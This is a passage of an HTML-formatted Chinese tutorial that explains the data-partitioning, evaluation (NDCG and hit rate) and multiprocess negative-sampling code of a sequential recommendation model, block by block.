class=\"line\"></span><br><span class=\"line\">        valid_user += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> rank &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">            NDCG += <span class=\"number\">1</span> / np.log2(rank + <span class=\"number\">2</span>)</span><br><span class=\"line\">            HT += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> valid_user % <span class=\"number\">100</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;.&#x27;</span>,</span><br><span class=\"line\">            sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> NDCG / valid_user, HT / valid_user</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evaluate_valid</span>(<span class=\"params\">model, dataset, args, sess</span>):</span><br><span class=\"line\">    [train, valid, test, usernum, itemnum] = copy.deepcopy(dataset)</span><br><span class=\"line\"></span><br><span class=\"line\">    NDCG = <span class=\"number\">0.0</span></span><br><span class=\"line\">    valid_user = <span class=\"number\">0.0</span></span><br><span class=\"line\">    HT = <span class=\"number\">0.0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> usernum&gt;<span class=\"number\">10000</span>:</span><br><span class=\"line\">        users = random.sample(xrange(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>), <span class=\"number\">10000</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        users = xrange(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> users:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(train[u]) &lt; <span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(valid[u]) &lt; <span class=\"number\">1</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([args.maxlen], dtype=np.int32)</span><br><span class=\"line\">        idx = args.maxlen - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(train[u]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        rated = <span class=\"built_in\">set</span>(train[u])</span><br><span class=\"line\">        rated.add(<span class=\"number\">0</span>)</span><br><span class=\"line\">        item_idx = [valid[u][<span class=\"number\">0</span>]]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> rated: t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            item_idx.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">        predictions = -model.predict(sess, [u], [seq], item_idx)</span><br><span class=\"line\">        predictions = predictions[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        rank = predictions.argsort().argsort()[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        valid_user += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> rank &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">            NDCG += <span class=\"number\">1</span> / np.log2(rank + <span class=\"number\">2</span>)</span><br><span class=\"line\">            HT += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> valid_user % <span class=\"number\">100</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;.&#x27;</span>,</span><br><span class=\"line\">            sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> NDCG / valid_user, HT / valid_user</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"导入模块\"><a class=\"anchor\" href=\"#导入模块\">#</a> 导入模块</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> copy</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> defaultdict</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：导入所需的模块，包括系统模块、深拷贝模块、随机数模块、数值计算模块和默认字典模块。</p>\n<h3 id=\"数据分割函数-data_partition\"><a class=\"anchor\" href=\"#数据分割函数-data_partition\">#</a> 数据分割函数  <code>data_partition</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">data_partition</span>(<span class=\"params\">fname</span>):</span><br><span class=\"line\">    usernum = <span class=\"number\">0</span></span><br><span class=\"line\">    itemnum = <span class=\"number\">0</span></span><br><span class=\"line\">    User = defaultdict(<span class=\"built_in\">list</span>)</span><br><span class=\"line\">    user_train = &#123;&#125;</span><br><span class=\"line\">    user_valid = &#123;&#125;</span><br><span class=\"line\">    user_test = &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\"># assume user/item index starting from 1</span></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;data/%s.txt&#x27;</span> % fname, <span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">        u, i = line.rstrip().split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">        u = <span class=\"built_in\">int</span>(u)</span><br><span class=\"line\">        i = <span class=\"built_in\">int</span>(i)</span><br><span class=\"line\">        usernum = <span class=\"built_in\">max</span>(u, usernum)</span><br><span class=\"line\">        itemnum = <span class=\"built_in\">max</span>(i, itemnum)</span><br><span class=\"line\">        User[u].append(i)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> User:</span><br><span class=\"line\">        nfeedback = <span class=\"built_in\">len</span>(User[user])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nfeedback &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">            user_train[user] = User[user]</span><br><span class=\"line\">            user_valid[user] = []</span><br><span class=\"line\">            user_test[user] = []</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            user_train[user] = User[user][:-<span class=\"number\">2</span>]</span><br><span class=\"line\">            user_valid[user] = []</span><br><span class=\"line\">            user_valid[user].append(User[user][-<span class=\"number\">2</span>])</span><br><span class=\"line\">            user_test[user] = []</span><br><span class=\"line\">            user_test[user].append(User[user][-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [user_train, user_valid, user_test, usernum, itemnum]</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：将数据分成训练集、验证集和测试集，并计算用户数和物品数。</p>\n<ul>\n<li><code>usernum</code>  和  <code>itemnum</code>  初始化为 0，用于记录最大用户 ID 和最大物品 ID。</li>\n<li><code>User</code> ：使用默认字典，记录每个用户的交互物品列表。</li>\n<li><code>user_train</code> 、 <code>user_valid</code>  和  <code>user_test</code> ：分别用于存储每个用户的训练集、验证集和测试集。</li>\n<li>打开文件，读取每一行数据，将用户 ID 和物品 ID 存入 <code>User</code>  字典，并更新 <code>usernum</code>  和 <code>itemnum</code> 。</li>\n<li>对每个用户，根据交互的物品数量进行数据分割：\n<ul>\n<li>如果交互物品数小于 3，全部放入训练集。</li>\n<li>否则，最后两个物品分别放入验证集和测试集，剩余的放入训练集。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"模型评估函数-evaluate\"><a class=\"anchor\" href=\"#模型评估函数-evaluate\">#</a> 模型评估函数  <code>evaluate</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evaluate</span>(<span class=\"params\">model, dataset, args, sess</span>):</span><br><span class=\"line\">    [train, valid, test, usernum, itemnum] = copy.deepcopy(dataset)</span><br><span class=\"line\"></span><br><span class=\"line\">    NDCG = <span class=\"number\">0.0</span></span><br><span class=\"line\">    HT = <span class=\"number\">0.0</span></span><br><span class=\"line\">    valid_user = <span class=\"number\">0.0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> usernum &gt; <span class=\"number\">10000</span>:</span><br><span class=\"line\">        users = random.sample(<span class=\"built_in\">range</span>(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>), <span class=\"number\">10000</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        users = <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> users:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(train[u]) &lt; <span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(test[u]) &lt; <span class=\"number\">1</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([args.maxlen], dtype=np.int32)</span><br><span class=\"line\">        idx = args.maxlen - <span class=\"number\">1</span></span><br><span class=\"line\">        seq[idx] = valid[u][<span class=\"number\">0</span>]</span><br><span class=\"line\">        idx -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(train[u]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\">        rated = <span class=\"built_in\">set</span>(train[u])</span><br><span class=\"line\">        rated.add(<span class=\"number\">0</span>)</span><br><span class=\"line\">        item_idx = [test[u][<span class=\"number\">0</span>]]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> rated: t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            item_idx.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">        predictions = -model.predict(sess, [u], [seq], item_idx)</span><br><span class=\"line\">        predictions = predictions[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        rank = predictions.argsort().argsort()[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        valid_user += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> rank &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">            NDCG += <span class=\"number\">1</span> / np.log2(rank + <span class=\"number\">2</span>)</span><br><span class=\"line\">            HT += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> valid_user % <span class=\"number\">100</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;.&#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> NDCG / valid_user, HT / valid_user</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：评估模型在测试集上的表现，计算 NDCG（归一化折损累积增益）和 HT（命中率）。</p>\n<ul>\n<li>深拷贝数据集，以免修改原始数据。</li>\n<li>初始化 NDCG、HT 和有效用户数。</li>\n<li>随机抽样 10000 个用户进行评估，如果用户总数大于 10000，否则评估所有用户。</li>\n<li>对每个用户，构建输入序列 <code>seq</code> ，包括训练数据和验证数据。</li>\n<li>生成负样本，将其与测试样本一起组成 <code>item_idx</code> 。</li>\n<li>通过模型预测，计算预测得分 <code>predictions</code> ，并对预测结果排序。</li>\n<li>计算排名，更新 NDCG 和 HT，打印进度。</li>\n</ul>\n<h3 id=\"模型评估函数验证集evaluate_valid\"><a class=\"anchor\" href=\"#模型评估函数验证集evaluate_valid\">#</a> 模型评估函数（验证集） <code>evaluate_valid</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evaluate_valid</span>(<span class=\"params\">model, dataset, args, sess</span>):</span><br><span class=\"line\">    [train, valid, test, usernum, itemnum] = copy.deepcopy(dataset)</span><br><span class=\"line\"></span><br><span class=\"line\">    NDCG = <span class=\"number\">0.0</span></span><br><span class=\"line\">    valid_user = <span class=\"number\">0.0</span></span><br><span class=\"line\">    HT = <span class=\"number\">0.0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> usernum &gt; <span class=\"number\">10000</span>:</span><br><span class=\"line\">        users = random.sample(<span class=\"built_in\">range</span>(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>), <span class=\"number\">10000</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        users = <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> users:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(train[u]) &lt; <span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(valid[u]) &lt; <span class=\"number\">1</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([args.maxlen], dtype=np.int32)</span><br><span class=\"line\">        idx = args.maxlen - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(train[u]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        rated = <span class=\"built_in\">set</span>(train[u])</span><br><span class=\"line\">        rated.add(<span class=\"number\">0</span>)</span><br><span class=\"line\">        item_idx = [valid[u][<span class=\"number\">0</span>]]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> rated: t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            item_idx.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">        predictions = -model.predict(sess, [u], [seq], item_idx)</span><br><span class=\"line\">        predictions = predictions[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        rank = predictions.argsort().argsort()[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        valid_user += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> rank &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">            NDCG += <span class=\"number\">1</span> / np.log2(rank + <span class=\"number\">2</span>)</span><br><span class=\"line\">            HT += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> valid_user % <span class=\"number\">100</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;.&#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> NDCG / valid_user, HT / valid_user</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：评估模型在验证集上的表现，计算 NDCG 和 HT。</p>\n<ul>\n<li>代码与 <code>evaluate</code>  类似，不同之处在于这里使用验证集 <code>valid</code>  进行评估，而不是测试集 <code>test</code> 。</li>\n</ul>\n<h2 id=\"samplerpy\"><a class=\"anchor\" href=\"#samplerpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3NhbXBsZXIucHk=\">sampler.py</span></h2>\n<p>这个代码实现了一个多进程的数据采样器，具体解析如下：</p>\n<ol>\n<li><strong> <code>random_neq</code>  函数</strong>：生成不在集合中的随机整数。</li>\n<li><strong> <code>sample_function</code>  函数</strong>：在多进程环境下进行数据采样，并将结果放入队列中。</li>\n<li><strong> <code>WarpSampler</code>  类</strong>：管理多个数据采样进程，提供获取批量数据的方法。</li>\n</ol>\n<p>这些功能共同构成了一个高效的多进程数据采样器，用于推荐系统中的序列化数据采样。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Process, Queue</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_neq</span>(<span class=\"params\">l, r, s</span>):</span><br><span class=\"line\">    t = np.random.randint(l, r)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        t = np.random.randint(l, r)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sample_function</span>(<span class=\"params\">user_train, usernum, itemnum, batch_size, maxlen, result_queue, SEED</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sample</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">        user = np.random.randint(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(user_train[user]) &lt;= <span class=\"number\">1</span>: user = np.random.randint(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        pos = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        neg = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        nxt = user_train[user][-<span class=\"number\">1</span>]</span><br><span class=\"line\">        idx = maxlen - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ts = <span class=\"built_in\">set</span>(user_train[user])</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(user_train[user][:-<span class=\"number\">1</span>]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            pos[idx] = nxt</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nxt != <span class=\"number\">0</span>: neg[idx] = random_neq(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>, ts)</span><br><span class=\"line\">            nxt = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (user, seq, pos, neg)</span><br><span class=\"line\"></span><br><span class=\"line\">    np.random.seed(SEED)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        one_batch = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(batch_size):</span><br><span class=\"line\">            one_batch.append(sample())</span><br><span class=\"line\"></span><br><span class=\"line\">        result_queue.put(<span class=\"built_in\">zip</span>(*one_batch))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">WarpSampler</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, User, usernum, itemnum, batch_size=<span class=\"number\">64</span>, maxlen=<span class=\"number\">10</span>, n_workers=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">        self.result_queue = Queue(maxsize=n_workers * <span class=\"number\">10</span>)</span><br><span class=\"line\">        self.processors = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n_workers):</span><br><span class=\"line\">            self.processors.append(</span><br><span class=\"line\">                Process(target=sample_function, args=(User,</span><br><span class=\"line\">                                                      usernum,</span><br><span class=\"line\">                                                      itemnum,</span><br><span class=\"line\">                                                      batch_size,</span><br><span class=\"line\">                                                      maxlen,</span><br><span class=\"line\">                                                      self.result_queue,</span><br><span class=\"line\">                                                      np.random.randint(<span class=\"number\">2e9</span>)</span><br><span class=\"line\">                                                      )))</span><br><span class=\"line\">            self.processors[-<span class=\"number\">1</span>].daemon = <span class=\"literal\">True</span></span><br><span class=\"line\">            self.processors[-<span class=\"number\">1</span>].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">next_batch</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.result_queue.get()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">close</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> self.processors:</span><br><span class=\"line\">            p.terminate()</span><br><span class=\"line\">            p.join()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"导入模块-2\"><a class=\"anchor\" href=\"#导入模块-2\">#</a> 导入模块</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Process, Queue</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：导入所需的模块，包括数值计算模块和多进程处理模块。</p>\n<h3 id=\"随机负样本生成函数-random_neq\"><a class=\"anchor\" href=\"#随机负样本生成函数-random_neq\">#</a> 随机负样本生成函数  <code>random_neq</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_neq</span>(<span class=\"params\">l, r, s</span>):</span><br><span class=\"line\">    t = np.random.randint(l, r)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        t = np.random.randint(l, r)</span><br><span class=\"line\">    